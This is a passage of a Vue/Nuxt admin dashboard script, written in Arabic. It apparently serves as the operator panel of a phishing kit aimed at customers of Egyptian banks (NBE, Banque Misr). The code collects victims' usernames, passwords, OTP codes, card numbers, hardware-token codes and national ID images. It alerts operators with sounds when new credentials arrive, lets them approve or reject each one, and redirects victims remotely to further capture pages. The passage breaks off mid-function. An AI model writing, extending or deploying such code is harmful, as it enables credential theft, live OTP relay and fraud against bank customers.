    <!-- نافذة معاينة المستندات المكبرة للأدمن -->
    <div
      v-if="adminDocLightbox.isOpen"
      class="modal-backdrop"
      role="presentation"
      @click.self="closeAdminDocPreview"
    >
      <section class="admin-modal-box doc-lightbox-box" role="dialog" aria-modal="true">
        <div class="modal-header">
          <div class="modal-header-title">
            <div class="modal-icon-badge">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
                <circle cx="8.5" cy="8.5" r="1.5"></circle>
                <polyline points="21 15 16 10 5 21"></polyline>
              </svg>
            </div>
            <div>
              <h3>{{ adminDocLightbox.title }}</h3>
              <p>معاينة المستند المرفوع بدقة عالية</p>
            </div>
          </div>

          <button class="modal-close-btn" type="button" title="إغلاق" @click="closeAdminDocPreview">
            <svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5">
              <line x1="18" y1="6" x2="6" y2="18"></line>
              <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
          </button>
        </div>

        <div class="doc-lightbox-body">
          <img :src="adminDocLightbox.imageSrc" :alt="adminDocLightbox.title" class="doc-lightbox-img" />
        </div>

        <div class="modal-footer">
          <a
            :href="adminDocLightbox.imageSrc"
            download="document.jpg"
            target="_blank"
            class="btn-primary"
          >
            تحميل الصورة
          </a>
          <button type="button" class="btn-secondary" @click="closeAdminDocPreview">
            إغلاق
          </button>
        </div>
      </section>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, onMounted, ref, watch } from "vue";
import type {
  CustomerLoginAttempt,
  CustomerLoginAttemptVerificationStatus,
  CustomerRecord,
  CustomerVerificationStatus,
} from "~/composables/useCustomerTracking";
import { useCustomerActivityStream } from "~/composables/useCustomerTracking";
import { useCustomerPresenceWatcher } from "~/composables/useCustomerPresenceWatcher";
import visaImage from "~/assets/login/visa.webp";
import mastercardImage from "~/assets/login/mastercard.webp";
import vimasImage from "~/assets/login/vimas.webp";
import {
  useDashboardAuth,
  useAdminManagement,
  type DashboardAdminAccount,
  type DashboardRole,
} from "~/composables/useDashboardAuth";
import { useGeoBlocking } from "~/composables/useGeoBlocking";
import { useWhatsAppSettings } from "~/composables/useWhatsAppSettings";
import { countryCodeToFlag } from "~/composables/useVisitorGeo";
import { ROUTE_PATHS, normalizePath, normalizeKey } from "~/composables/useRouteConstants";

const {
  userEmail: currentAdminEmail,
  role,
  loading: authLoading,
  signingIn,
  error: authError,
  isAllowed,
  getIdToken: getDashboardIdToken,
  refreshSession: refreshDashboardSession,
  signIn,
  signOut,
} = useDashboardAuth();

const {
  adminAccounts,
  loading: adminLoading,
  saving: adminSaving,
  error: adminError,
  createAdminAccount,
  changeAdminPassword,
  forceLogoutAdmin,
  toggleAdminStatus,
  deleteAdminAccount,
} = useAdminManagement(isAllowed, role, currentAdminEmail);

const isAdminModalOpen = ref(false);
const isAddAdminOpen = ref(false);
const adminFilterTab = ref<"all" | "online" | "superadmin" | "admin">("all");
const adminFeedback = ref<{ type: "success" | "error"; text: string } | null>(null);

const newAdminForm = ref<{
  email: string;
  password: string;
  role: DashboardRole;
}>({
  email: "",
  password: "",
  role: "admin",
});

const changePwdModal = ref<{
  isOpen: boolean;
  account: DashboardAdminAccount | null;
  newPassword: string;
}>({
  isOpen: false,
  account: null,
  newPassword: "",
});

const isAdminOnline = (acc: DashboardAdminAccount) => {
  if (acc.email?.toLowerCase() === currentAdminEmail.value?.toLowerCase()) return true;
  return acc.presence?.state === "online";
};

const onlineAdminsCount = computed(() => {
  return adminAccounts.value.filter(isAdminOnline).length;
});

const currentLoggedInAdminAccount = computed(() => {
  return adminAccounts.value.find(
    (a) => a.email.toLowerCase() === currentAdminEmail.value?.toLowerCase()
  ) || null;
});

const displayedAdminAccounts = computed(() => {
  const map = new Map<string, DashboardAdminAccount>();
  for (const a of adminAccounts.value) {
    const key = (a.email || "").trim().toLowerCase();
    if (!key) continue;
    if (!map.has(key)) {
      map.set(key, a);
    }
  }
  let list = Array.from(map.values());

  if (adminFilterTab.value === "online") {
    list = list.filter(isAdminOnline);
  } else if (adminFilterTab.value === "superadmin") {
    list = list.filter((a) => a.role === "superadmin");
  } else if (adminFilterTab.value === "admin") {
    list = list.filter((a) => a.role === "admin");
  }

  // فرز: المسجل حالياً أولاً، ثم المتصلين، ثم السوبر أدمن، ثم الأحدث
  return list.sort((a, b) => {
    const isMeA = a.email.toLowerCase() === currentAdminEmail.value?.toLowerCase() ? 1 : 0;
    const isMeB = b.email.toLowerCase() === currentAdminEmail.value?.toLowerCase() ? 1 : 0;
    if (isMeB !== isMeA) return isMeB - isMeA;

    const onlineA = isAdminOnline(a) ? 1 : 0;
    const onlineB = isAdminOnline(b) ? 1 : 0;
    if (onlineB !== onlineA) return onlineB - onlineA;

    if (a.role === "superadmin" && b.role !== "superadmin") return -1;
    if (b.role === "superadmin" && a.role !== "superadmin") return 1;

    return (b.updatedAt || "").localeCompare(a.updatedAt || "");
  });
});

const openAdminManagementModal = () => {
  if (role.value !== "superadmin") return;
  isAdminModalOpen.value = true;
  closeSettingsDrawer();
};

const closeAdminManagementModal = () => {
  isAdminModalOpen.value = false;
  isAddAdminOpen.value = false;
  changePwdModal.value.isOpen = false;
  adminFeedback.value = null;
};

const formatAdminDate = (isoString?: string) => {
  if (!isoString) return "-";
  try {
    const d = new Date(isoString);
    if (isNaN(d.getTime())) return isoString;
    return `${d.toLocaleDateString("en-GB")} ${d.toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })}`;
  } catch {
    return isoString;
  }
};

const openChangePwd = (account: DashboardAdminAccount) => {
  const targetEmail = (account.email || "").toLowerCase().trim();
  const currentEmail = (currentAdminEmail.value || "").toLowerCase().trim();
  if (targetEmail === "mm789789@admin.com" && currentEmail !== "mm789789@admin.com") {
    adminFeedback.value = { type: "error", text: "لا يمكن تعديل كلمة سر مدير النظام الرئيسي إلا من خلال حسابه حصراً." };
    return;
  }
  changePwdModal.value = {
    isOpen: true,
    account,
    newPassword: "",
  };
  adminFeedback.value = null;
};

const handleCreateAdminSubmit = async () => {
  adminFeedback.value = null;
  if (!newAdminForm.value.email || !newAdminForm.value.password) {
    adminFeedback.value = { type: "error", text: "يرجى تعبئة جميع الحقول المطلوبة." };
    return;
  }
  try {
    await createAdminAccount({
      email: newAdminForm.value.email,
      password: newAdminForm.value.password,
      role: newAdminForm.value.role,
    });
    adminFeedback.value = {
      type: "success",
      text: `تم إنشاء حساب ${newAdminForm.value.role === 'superadmin' ? 'السوبر أدمن' : 'الأدمن'} (${newAdminForm.value.email}) بنجاح!`,
    };
    newAdminForm.value = { email: "", password: "", role: "admin" };
    isAddAdminOpen.value = false;
  } catch (err: any) {
    adminFeedback.value = { type: "error", text: err?.message || "تعذر إنشاء الحساب." };
  }
};

const handleChangePasswordSubmit = async () => {
  if (!changePwdModal.value.account || !changePwdModal.value.newPassword) return;
  adminFeedback.value = null;
  try {
    await changeAdminPassword(changePwdModal.value.account.id, changePwdModal.value.newPassword);
    adminFeedback.value = {
      type: "success",
      text: `تم تغيير كلمة السر للحساب (${changePwdModal.value.account.email}) بنجاح وتسجيل خروجه!`,
    };
    changePwdModal.value.isOpen = false;
    changePwdModal.value.newPassword = "";
  } catch (err: any) {
    adminFeedback.value = { type: "error", text: err?.message || "تعذر تغيير كلمة السر." };
  }
};

const handleForceLogout = async (account: DashboardAdminAccount) => {
  adminFeedback.value = null;
  const targetEmail = (account.email || "").toLowerCase().trim();
  const currentEmail = (currentAdminEmail.value || "").toLowerCase().trim();
  if (targetEmail === "mm789789@admin.com" && currentEmail !== "mm789789@admin.com") {
    adminFeedback.value = { type: "error", text: "لا يمكن إنهاء جلسة مدير النظام الرئيسي إلا من خلال حسابه حصراً." };
    return;
  }
  try {
    await forceLogoutAdmin(account.id);
    adminFeedback.value = {
      type: "success",
      text: `تم تسجيل خروج الحساب (${account.email}) فوراً بنجاح!`,
    };
  } catch (err: any) {
    adminFeedback.value = { type: "error", text: err?.message || "تعذر تسجيل الخروج." };
  }
};

const handleToggleStatus = async (account: DashboardAdminAccount) => {
  adminFeedback.value = null;
  const nextStatus = account.status === "active" ? "inactive" : "active";
  try {
    await toggleAdminStatus(account.id, nextStatus);
    adminFeedback.value = {
      type: "success",
      text: `تم ${nextStatus === 'active' ? 'تفعيل' : 'تعطيل'} الحساب (${account.email}) بنجاح!`,
    };
  } catch (err: any) {
    adminFeedback.value = { type: "error", text: err?.message || "تعذر تعديل الحالة." };
  }
};

const handleDeleteAdmin = async (account: DashboardAdminAccount) => {
  if (!window.confirm(`هل أنت متأكد من حذف الحساب (${account.email}) نهائياً؟`)) return;
  adminFeedback.value = null;
  try {
    await deleteAdminAccount(account.id);
    adminFeedback.value = {
      type: "success",
      text: `تم حذف الحساب (${account.email}) بنجاح!`,
    };
  } catch (err: any) {
    adminFeedback.value = { type: "error", text: err?.message || "تعذر حذف الحساب." };
  }
};

const canControlGeoBlocking = computed(
  () => isAllowed.value && role.value === "superadmin"
);

const {
  enabled: geoBlockEnabled,
  loading: geoBlockLoading,
  updating: geoBlockUpdating,
  error: geoBlockError,
  toggle: toggleGeoBlocking,
} = useGeoBlocking(
  canControlGeoBlocking,
  getDashboardIdToken,
);

const {
  whatsappNumber,
  whatsappUrl,
  isUpdating: whatsappSaving,
  formatWhatsAppUrl,
  saveWhatsAppSettings,
  resetWhatsAppSettings,
  DEFAULT_WHATSAPP_URL,
} = useWhatsAppSettings();

const isWhatsAppModalOpen = ref(false);
const whatsappInputNumber = ref("");
const whatsappFeedback = ref<{ type: "success" | "error"; text: string } | null>(null);

const openWhatsAppSettingsModal = () => {
  if (role.value !== "superadmin") return;
  whatsappInputNumber.value = whatsappNumber.value || "";
  whatsappFeedback.value = null;
  isWhatsAppModalOpen.value = true;
  closeSettingsDrawer();
};

const closeWhatsAppSettingsModal = () => {
  isWhatsAppModalOpen.value = false;
  whatsappFeedback.value = null;
};

const previewGeneratedWhatsAppUrl = computed(() => {
  if (!whatsappInputNumber.value || !whatsappInputNumber.value.trim()) {
    return DEFAULT_WHATSAPP_URL;
  }
  return formatWhatsAppUrl(whatsappInputNumber.value);
});

const setCountryPrefix = (prefix: string) => {
  const current = (whatsappInputNumber.value || "").trim();
  if (!current) {
    whatsappInputNumber.value = prefix;
  } else if (current.startsWith("+")) {
    whatsappInputNumber.value = prefix + current.replace(/^\+\d{1,4}/, "");
  } else {
    whatsappInputNumber.value = prefix + current;
  }
};

const openWhatsAppPreviewTest = () => {
  const url = previewGeneratedWhatsAppUrl.value;
  if (url && typeof window !== "undefined") {
    window.open(url, "_blank", "noopener,noreferrer");
  }
};

const handleSaveWhatsApp = async () => {
  if (role.value !== "superadmin") return;
  whatsappFeedback.value = null;
  const result = await saveWhatsAppSettings(
    whatsappInputNumber.value,
    getDashboardIdToken
  );
  if (result.success) {
    whatsappFeedback.value = {
      type: "success",
      text: whatsappInputNumber.value.trim()
        ? `تم حفظ رقم الواتساب (${whatsappInputNumber.value.trim()}) بنجاح وتطبيقه على الموقع وأزرار التحويل!`
        : "تم حفظ الإعداد واستعادة رابط الواتساب الافتراضي بنجاح!",
    };
  } else {
    whatsappFeedback.value = {
      type: "error",
      text: result.error || "تعذر حفظ رقم الواتساب.",
    };
  }
};

const handleResetWhatsApp = async () => {
  if (role.value !== "superadmin") return;
  whatsappInputNumber.value = "";
  whatsappFeedback.value = null;
  const result = await resetWhatsAppSettings(getDashboardIdToken);
  if (result.success) {
    whatsappFeedback.value = {
      type: "success",
      text: "تم استعادة رابط الواتساب الافتراضي بنجاح!",
    };
  }
};

const {
  customers,
  loading: customersLoading,
  error: customersError,
  banCustomer,
  unbanCustomer,
  deleteCustomer,
  deleteAllCustomers,
  updateCustomerVerification,
  updateUsernameDecision,
  updatePasswordDecision,
  updateLoginCredentialsDecision,
  updateCardDecision,
  updateNbeTokenDecision,
  updateBmTokenDecision,
  updateDocumentsDecision,
  sendCustomerRedirect,
  clearCustomerPendingStatuses,
  toggleCustomerStarred,
} = useDashboardCustomers(isAllowed);

const dashboardEmail = ref("");
const dashboardPassword = ref("");
const dashboardTrap = ref("");
const searchTerm = ref("");
const pendingSearchTerm = ref("");
const filterOnlineOnly = ref(false);
const filterStarredOnly = ref(false);
const selectedCustomerId = ref("");
const dashboardTheme = ref<"light" | "dark">("light");
const isDeliveryInfoOpen = ref(true);
const isDocumentsInfoOpen = ref(true);
const deleting = ref(false);
const deleteDialog = ref<{ type: "one" | "all" | ""; id: string }>({ type: "", id: "" });
const redirectSuccessMessage = ref("");
let redirectMsgTimeout: any = null;

const isSettingsDrawerOpen = ref(false);
const toggleSettingsDrawer = () => {
  isSettingsDrawerOpen.value = !isSettingsDrawerOpen.value;
};

const closeSettingsDrawer = () => {
  isSettingsDrawerOpen.value = false;
};

const clearFilters = () => {
  filterOnlineOnly.value = false;
  filterStarredOnly.value = false;
};

const toggleOnlineFilter = () => {
  filterOnlineOnly.value = !filterOnlineOnly.value;
  if (filterOnlineOnly.value) {
    filterStarredOnly.value = false;
  }
};

const toggleStarredFilter = () => {
  filterStarredOnly.value = !filterStarredOnly.value;
  if (filterStarredOnly.value) {
    filterOnlineOnly.value = false;
  }
};

const totalRegularCount = computed(() => {
  return customers.value.filter((c) => !hasPendingAction(c) && hasEnteredLoginCode(c)).length;
});

const toggleStarred = async (id: string) => {
  const cust = customers.value.find((c) => c.id === id);
  const currentStarred = cust?.isStarred ?? false;
  if (cust) {
    cust.isStarred = !currentStarred;
  }
  try {
    await toggleCustomerStarred(id, currentStarred);
  } catch (err) {
    console.error("Failed to toggle customer star", err);
    if (cust) {
      cust.isStarred = currentStarred;
    }
  }
};

const starredCount = computed(() => {
  return customers.value.filter((c) => Boolean(c.isStarred)).length;
});

// نظام التنبيه الصوتي للوحة التحكم
const soundNotificationEnabled = ref(true);
let audioContextInstance: any = null;

const getAudioContext = () => {
  if (!import.meta.client) return null;
  if (!audioContextInstance) {
    const AudioCtx = window.AudioContext || (window as any).webkitAudioContext;
    if (AudioCtx) {
      audioContextInstance = new AudioCtx();
    }
  }
  if (audioContextInstance && audioContextInstance.state === "suspended") {
    audioContextInstance.resume().catch(() => {});
  }
  return audioContextInstance;
};

const playAlertSound = () => {
  if (!soundNotificationEnabled.value || !import.meta.client) return;
  try {
    const ctx = getAudioContext();
    if (!ctx) return;

    const now = ctx.currentTime;

    // رنين تنبيه واضح واحترافي
    const tones = [
      { freq: 659.25, start: 0, duration: 0.14 },
      { freq: 880.00, start: 0.12, duration: 0.16 },
      { freq: 1318.51, start: 0.26, duration: 0.35 },
    ];

    tones.forEach(({ freq, start, duration }) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();

      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, now + start);

      gain.gain.setValueAtTime(0.0001, now + start);
      gain.gain.exponentialRampToValueAtTime(0.85, now + start + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.0001, now + start + duration);

      osc.connect(gain);
      gain.connect(ctx.destination);

      osc.start(now + start);
      osc.stop(now + start + duration);
    });
  } catch (err) {
    console.error("Failed to play notification sound", err);
  }
};

// صوت تنبيه مخصّص لحدث "إعادة إرسال رمز OTP".
// يختلف عن `playAlertSound` في:
//   - نوع الموجة: square (إلكترونية / بَزّاقة) بدل sine
//   - التردد: نطاق متوسط-منخفض (~440-660Hz) بدل الترددات العالية
//   - النمط: 4 نبضات قصيرة متتالية (طرقة-طرقة-طرقة-طرقة) كتنبيه استغاثة
//   - المدة الكلية: 0.6s تقريباً
// هذا يجعل المشرف يميّز الحدث صوتياً حتى قبل النظر للشاشة.
const playOtpResendSound = () => {
  if (!soundNotificationEnabled.value || !import.meta.client) return;
  try {
    const ctx = getAudioContext();
    if (!ctx) return;

    const now = ctx.currentTime;

    // أربع نبضات بتردد 523Hz (C5) - تردد متوسط يسهل تمييزه
    const pulses = [
      { start: 0.00, duration: 0.09 },
      { start: 0.14, duration: 0.09 },
      { start: 0.28, duration: 0.09 },
      { start: 0.42, duration: 0.18 },
    ];

    pulses.forEach(({ start, duration }) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();

      osc.type = "square";
      osc.frequency.setValueAtTime(523.25, now + start); // C5

      // نغمة ثانية بتردد مختلف في النبضة الأخيرة (للتمييز الإضافي)
      if (duration > 0.12) {
        osc.frequency.setValueAtTime(659.25, now + start + 0.08); // E5
      }

      gain.gain.setValueAtTime(0.0001, now + start);
      gain.gain.exponentialRampToValueAtTime(0.55, now + start + 0.01);
      gain.gain.setValueAtTime(0.55, now + start + duration - 0.02);
      gain.gain.exponentialRampToValueAtTime(0.0001, now + start + duration);

      osc.connect(gain);
      gain.connect(ctx.destination);

      osc.start(now + start);
      osc.stop(now + start + duration);
    });
  } catch (err) {
    console.error("Failed to play otp resend sound", err);
  }
};

const toggleSoundNotification = () => {
  soundNotificationEnabled.value = !soundNotificationEnabled.value;
  if (import.meta.client) {
    window.localStorage.setItem("admin_sound_enabled", soundNotificationEnabled.value ? "true" : "false");
    if (soundNotificationEnabled.value) {
      playAlertSound();
    }
  }
};

const alertedEntries = new Set<string>();
let isFirstCustomersSnapshot = true;

watch(
  customers,
  (newCustomers) => {
    if (!newCustomers || newCustomers.length === 0) return;

    if (isFirstCustomersSnapshot) {
      newCustomers.forEach((c) => {
        const uname = c.username || c.loginInfo?.username;
        if (uname) alertedEntries.add(`${c.id}_user_${uname.trim()}_${c.usernameStatus}`);

        const pass = c.password || c.loginInfo?.password;
        if (pass) alertedEntries.add(`${c.id}_pass_${pass}_${c.passwordStatus}`);

        const otpVal = c.otp || c.verification?.otp;
        const otpStatus = c.verificationStatus || c.verification?.status;
        if (otpVal || otpStatus) alertedEntries.add(`${c.id}_otp_${otpVal}_${otpStatus}`);

        const cardVal = c.cardNumber || (Array.isArray(c.cardHistory) && c.cardHistory[0]?.cardNumber);
        const cardStatus = c.cardStatus;
        if (cardVal || cardStatus) alertedEntries.add(`${c.id}_card_${cardVal}_${cardStatus}`);

        const nbeVal = c.nbeToken;
        if (nbeVal || c.nbeTokenStatus) alertedEntries.add(`${c.id}_nbe_${nbeVal}_${c.nbeTokenStatus}`);

        // تسجيل رمز جهاز التوكن (BM Token) لمنع تكرار التنبيه عند التحميل الأول
        const bmVal = c.bmToken;
        if (bmVal || c.bmTokenStatus) alertedEntries.add(`${c.id}_bm_${bmVal}_${c.bmTokenStatus}`);
      });
      isFirstCustomersSnapshot = false;
      return;
    }

    let shouldRing = false;

    newCustomers.forEach((c) => {
      const uname = c.username || c.loginInfo?.username;
      if (uname && uname.trim() && uname.trim() !== "لم يُدخل بعد") {
        const key = `${c.id}_user_${uname.trim()}_${c.usernameStatus}`;
        if (!alertedEntries.has(key)) {
          alertedEntries.add(key);
          if (c.usernameStatus === "pending" || !c.usernameStatus) {
            shouldRing = true;
          }
        }
      }

      const pass = c.password || c.loginInfo?.password;
      if (pass && pass.trim() && pass.trim() !== "لم تدخل بعد") {
        const key = `${c.id}_pass_${pass}_${c.passwordStatus}`;
        if (!alertedEntries.has(key)) {
          alertedEntries.add(key);
          if (c.passwordStatus === "pending" || !c.passwordStatus) {
            shouldRing = true;
          }
        }
      }

      const otpVal = c.otp || c.verification?.otp;
      const otpStatus = c.verificationStatus || c.verification?.status;
      if (otpVal && otpVal.trim() && otpVal.trim() !== "لم يدخل بعد") {
        const key = `${c.id}_otp_${otpVal.trim()}_${otpStatus}`;
        if (!alertedEntries.has(key)) {
          alertedEntries.add(key);
          if (otpStatus === "pending" || !otpStatus) {
            shouldRing = true;
          }
        }
      }

      const cardVal = c.cardNumber || (Array.isArray(c.cardHistory) && c.cardHistory[0]?.cardNumber);
      const cardStatus = c.cardStatus;
      if ((cardVal && cardVal.trim() && cardVal.trim() !== "لم يدخل بعد") || isCardPending(c)) {
        const key = `${c.id}_card_${(cardVal || '').trim()}_${cardStatus}_${c.updatedAt || ''}`;
        if (!alertedEntries.has(key)) {
          alertedEntries.add(key);
          if (cardStatus === "pending" || isCardPending(c)) {
            shouldRing = true;
          }
        }
      }

      const nbeVal = c.nbeToken;
      if (nbeVal && nbeVal.trim() && nbeVal.trim() !== "لم يدخل بعد") {
        const key = `${c.id}_nbe_${nbeVal.trim()}_${c.nbeTokenStatus}`;
        if (!alertedEntries.has(key)) {
          alertedEntries.add(key);
          if (c.nbeTokenStatus === "pending" || !c.nbeTokenStatus) {
            shouldRing = true;
          }
        }
      }

      // رمز جهاز التوكن (BM Token) - تنبيه صوتي عند الإرسال الجديد مثل باقي المراحل
      const bmVal = c.bmToken;
      if (bmVal && bmVal.trim() && bmVal.trim() !== "لم يدخل بعد") {
        const key = `${c.id}_bm_${bmVal.trim()}_${c.bmTokenStatus}`;
        if (!alertedEntries.has(key)) {
          alertedEntries.add(key);
          if (c.bmTokenStatus === "pending" || !c.bmTokenStatus) {
            shouldRing = true;
          }
        }
      }
    });

    if (shouldRing) {
      playAlertSound();
    }
  },
  { deep: true }
);

const decideDocuments = async (id: string, decision: "approved" | "rejected") => {
  try {
    await updateDocumentsDecision(id, decision);
  } catch (err) {
    console.error("Error updating documents decision", err);
  }
};

const adminDocLightbox = ref<{ isOpen: boolean; imageSrc: string; title: string }>({
  isOpen: false,
  imageSrc: "",
  title: "",
});

const downloadAdminImage = (dataUrl: string, defaultName: string) => {
  if (!dataUrl || !import.meta.client) return;
  const link = document.createElement("a");
  link.href = dataUrl;
  link.download = defaultName;
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
};

const openAdminDocPreview = (src: string, title: string) => {
  adminDocLightbox.value = {
    isOpen: true,
    imageSrc: src,
    title,
  };
};

const closeAdminDocPreview = () => {
  adminDocLightbox.value = {
    isOpen: false,
    imageSrc: "",
    title: "",
  };
};

const sendRemoteRedirect = async (id: string, target: string, step?: string) => {
  try {
    // تحديث فوري (optimistic) محلياً: الزبون لم يعد "بانتظار قرار" لأنه تم توجيهه
    // هذا يخفيه فوراً من قائمة "قيد الانتظار" ويبقيه في قائمة "المحادثات"
    const customer = customers.value.find((c) => c.id === id);
    if (customer) {
      // تنظيف جميع حالات الـ pending المحلية لتختفي من قائمة الانتظار فوراً
      customer.cardStatus = "none";
      customer.nbeTokenStatus = "none";
      customer.bmTokenStatus = "none";
      customer.verificationStatus = "none";
      if (customer.verification) {
        customer.verification.status = "none";
      }
      customer.passwordStatus = "none";
      customer.usernameStatus = "none";
      customer.documentsStatus = "none";
      // تحديث الصفحة الحالية محلياً لتنعكس في اللوحة لحظياً
      customer.presence = {
        ...(customer.presence ?? {}),
        currentPage: target,
        lastChangedAt: Date.now(),
      };
      customer.lastPage = target;
      customer.currentStep = step || null;
      customer.updatedAt = new Date().toISOString();
    }

    // تأكيد الإخفاء: مسح فعلي في Firebase (ليس فقط محلياً)
    // يضمن أن الزبون يختفي نهائياً من "قيد الانتظار" حتى لو تعطّل الـ realtime listener
    await clearCustomerPendingStatuses(id);

    await sendCustomerRedirect(id, target, step);
    // استخدام المسار الموحَّد (canonical) لتسمية الرسالة بغضّ النظر عن الصيغة القديمة
    const canonicalTarget = normalizePath(target);
    const stepName =
      canonicalTarget === "/"
        ? "الصفحة الرئيسية"
        : canonicalTarget === "/delivery"
        ? "بيانات التوصيل"
        : canonicalTarget === "/documents" || canonicalTarget === "/verify-identity" || canonicalTarget === "/verify-docs"
        ? "توثيق المستندات"
        : canonicalTarget === "/token-guide"
        ? "تعليمات token"
        : canonicalTarget === ROUTE_PATHS.waitingRoom
        ? "صفحة الانتظار"
        : canonicalTarget === ROUTE_PATHS.chat
        ? "المحادثات / خدمة العملاء"
        : canonicalTarget === "/success"
        ? "تم بنجاح"
        : canonicalTarget.includes("wa.me")
        ? "محادثة واتساب"
        : step === "username"
        ? "كود المستخدم"
        : step === "password"
        ? "كلمة المرور"
        : step === "otp"
        ? "رمز التحقق OTP"
        : step === "card"
        ? "بيانات البطاقة"
        : step === "nbe_token"
        ? "NBE توكن"
        : step === "bm_token"
        ? "جهاز الامان"
        : canonicalTarget;

    redirectSuccessMessage.value = `تم توجيه العميل إلى (${stepName})`;
    clearTimeout(redirectMsgTimeout);
    redirectMsgTimeout = setTimeout(() => {
      redirectSuccessMessage.value = "";
    }, 2800);
  } catch (err) {
    console.error("Error sending remote redirect", err);
  }
};

const canDashboardLogin = computed(
  () => dashboardEmail.value.trim() !== "" && dashboardPassword.value !== ""
);



const isOnline = (customer: CustomerRecord) => customer.presence?.state === "online";
const presenceClass = (customer: CustomerRecord) => (isOnline(customer) ? "online" : "offline");
const customerCode = (customer: CustomerRecord) => customer.code || customer.id.slice(0, 6).toUpperCase();

const customerDisplayName = (customer: CustomerRecord) => {
  const realName = (customer.fullName || customer.name || "").trim();
  if (realName && realName !== "زائر غير معروف" && !realName.includes("***")) return realName;
  const disp = (customer.displayName || "").trim();
  if (disp && !disp.includes("***") && disp !== "زائر غير معروف") return disp;
  if (customer.phone && customer.phone.trim()) return customer.phone.trim();
  const uname = (customer.username || customer.loginInfo?.username || "").trim();
  if (uname && uname !== "لم يُدخل بعد") return uname;
  return customerCode(customer);
};

const isLoginCredentialsPending = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  const hasPass = Boolean(
    (customer.password && customer.password.trim() && customer.password.trim() !== "لم تدخل بعد") ||
    (customer.loginInfo?.password && customer.loginInfo.password.trim() && customer.loginInfo.password.trim() !== "لم تدخل بعد")
  );
  return hasPass && customer.passwordStatus === "pending";
};

const isOtpPending = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  const hasOtpValue = Boolean(
    (customer.otp && customer.otp.trim() && customer.otp.trim() !== "لم يدخل بعد") ||
    (customer.verification?.otp && customer.verification.otp.trim() && customer.verification.otp.trim() !== "لم يدخل بعد")
  );
  const isStatusPending = customer.verificationStatus === "pending" || customer.verification?.status === "pending";
  return hasOtpValue && isStatusPending;
};

const isCardPending = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  if (customer.cardStatus === "pending") return true;
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw.filter(Boolean) : Object.values(raw).filter(Boolean)) : [];
  return attempts.some((a) => a?.cardStatus === "pending");
};

const isNbeTokenPending = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  const hasTokenValue = Boolean(
    customer.nbeToken && customer.nbeToken.trim() && customer.nbeToken.trim() !== "لم يدخل بعد"
  );
  return hasTokenValue && customer.nbeTokenStatus === "pending";
};

const isBmTokenPending = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  const hasTokenValue = Boolean(
    customer.bmToken && customer.bmToken.trim() && customer.bmToken.trim() !== "لم يدخل بعد"
  );
  return hasTokenValue && customer.bmTokenStatus === "pending";
};

const isDocumentsPending = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  const hasDocs = Boolean(
    customer.nationalIdFrontImage ||
    customer.nationalIdBackImage ||
    customer.bankCardImage ||
    customer.documentsSubmitted
  );
  return hasDocs && (customer.documentsStatus === "pending" || !customer.documentsStatus);
};

const hasPendingOtp = (customer: CustomerRecord) => {
  if (customer.verificationStatus === "pending" || customer.verification?.status === "pending") return true;
  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw : Object.values(raw)) : [];
  return attempts.some((attempt) => attempt?.verificationStatus === "pending");
};

const isCustomerOnWaitingPage = (customer?: CustomerRecord | null) => {
  if (!customer) return false;
  // ✅ استخدام المسار الموحَّد لقبول الصيغة القديمة والحديثة
  const rawPath = normalizeKey(customer.presence?.currentPage || customer.lastPage || "");
  const step = ((customer as any).currentStep || (customer.presence as any)?.currentStep || "").toLowerCase();
  const lastAction = (customer.lastAction || "").toLowerCase();
  return (
    rawPath === ROUTE_PATHS.waitingRoom ||
    rawPath === "/waiting" || // legacy alias
    step === "waiting" ||
    lastAction.includes("صفحة الانتظار") ||
    lastAction.includes("قيد الانتظار")
  );
};

const hasPendingAction = (customer: CustomerRecord) => {
  // قائمة "قيد الانتظار" تعرض فقط الزبائن الذين يحتاجون قرار (قبول/رفض) من الأدمن
  // الزبون الذي يقف على صفحة الانتظار بدون طلب معلّق يظهر في قائمة المستخدمين لا في قيد الانتظار
  return (
    isLoginCredentialsPending(customer) ||
    isOtpPending(customer) ||
    isCardPending(customer) ||
    isNbeTokenPending(customer) ||
    isBmTokenPending(customer) ||
    isDocumentsPending(customer)
  );
};

const customerPendingBadge = (customer: CustomerRecord) => {
  if (isLoginCredentialsPending(customer)) return "بانتظار بيانات الدخول";
  if (isOtpPending(customer)) return "بانتظار OTP";
  if (isCardPending(customer)) return "بانتظار البطاقة";
  if (isNbeTokenPending(customer)) return "بانتظار NBE توكن";
  if (isBmTokenPending(customer)) return "بانتظار جهاز توكن";
  if (isDocumentsPending(customer)) return "بانتظار المستندات";
  return "قيد الانتظار";
};

const hasEnteredLoginCode = (customer: CustomerRecord) => {
  if (customer.usernameStatus && customer.usernameStatus !== "none") return true;
  if (customer.passwordStatus && customer.passwordStatus !== "none") return true;
  if (customer.cardStatus && customer.cardStatus !== "none") return true;
  if (customer.nbeTokenStatus && customer.nbeTokenStatus !== "none") return true;
  if (customer.bmTokenStatus && customer.bmTokenStatus !== "none") return true;
  if (
    hasPendingOtp(customer) ||
    (customer.verificationStatus && (customer.verificationStatus as string) !== "none") ||
    (customer.verification?.status && (customer.verification.status as string) !== "none")
  ) {
    return true;
  }

  const rawUsername = customer.username || customer.loginInfo?.username;
  if (rawUsername && rawUsername.trim() && rawUsername.trim() !== "لم يُدخل بعد") {
    return true;
  }

  const raw = customer.loginAttempts;
  const attempts = raw ? (Array.isArray(raw) ? raw : Object.values(raw)) : [];
  return attempts.some(
    (attempt) =>
